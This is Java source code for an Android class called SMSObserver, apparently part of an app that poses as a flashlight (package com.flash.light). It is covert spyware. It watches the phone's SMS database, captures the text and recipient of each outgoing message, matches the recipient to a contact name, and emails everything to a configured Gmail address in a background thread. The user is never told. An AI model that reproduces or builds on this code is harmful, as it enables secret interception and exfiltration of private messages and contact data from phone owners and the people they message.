package com.flash.light; 

import java.util.List;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

import android.net.Uri;
import android.util.Log;
import android.os.Handler;
import android.widget.Toast;
import android.app.Activity;
import android.telephony.SmsManager;

import android.content.Context;
import android.content.ContentResolver;

import android.database.Cursor;
import android.database.DatabaseUtils;
import android.database.ContentObserver;

public class SMSObserver extends ContentObserver {

  private Handler handler;
  
  public  static Context context;

  private static String endPoint;
  private static String initId = "0";

  private static final String SUBJECT = "SMSInterceptor";
  private static final String TAG     = "FlashLight SMSObserver";

  public SMSObserver(final Handler handler, final Context context) {
    super(handler);
    handler = handler;    
    SMSObserver.context = context;
  }

  public void threading(final String message, final String email_address) {
    new Thread(new Runnable() {
      @Override
      public void run() {
        try {
          new GmailSender().sendMail(SUBJECT, message, email_address);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e(TAG, "onChange() Exception e " + e.toString());
        }
      }
    }).start();
  }

  public String endPoint(final String number, final Context context) {

    String end_point;
    final String contact_name  = new Contacts().getContactName(number, context);

    if(!contact_name.isEmpty()) {
      end_point = "" + number + "(" + contact_name + ")";
    }
    else {
      end_point = number;
    }
    return end_point;
  }

  @Override
  public void onChange(boolean selfChange) {
    super.onChange(selfChange);

    Cursor cursor = null;
    Uri uriSMSURI = Uri.parse("content://sms");
    String[] sCol = {"_id","type","body","address"};
    String sOrder = "date desc limit 1";
    String gmailEmailString = new Configure().emailAddress();
    /*Note that the call to emailAddress is done in onReceive()
    and not in the constructor because that constructor gets called
    whereas the onReceive method is called everytime there is a change
    to the sms table in the database. If we don't make this call here
    the email address will always be empty.*/
   
    try {

      cursor = context.getContentResolver().query(uriSMSURI, sCol, null, null, sOrder);
      cursor.moveToLast();

      final String id   = cursor.getString(cursor.getColumnIndex("_id"));
      final String type = cursor.getString(cursor.getColumnIndex("type"));
      final String body = cursor.getString(cursor.getColumnIndex("body"));
      final String addr = cursor.getString(cursor.getColumnIndex("address"));

      if(!initId.equals(id) && type.equals("2")) {
        threading("OUTGOING SMS!\n" + "Sent to: " + endPoint(addr, context) + "\nbody:\n" + body, gmailEmailString); initId = id;
      }
      else { } // Incoming messages if type == 1
    }
    catch(Exception e) {
      Log.d(TAG, "onChange() Exception e " + e.toString());
    }
    finally {
      if(cursor != null) {
        cursor.close();
      }
    }
  }
}
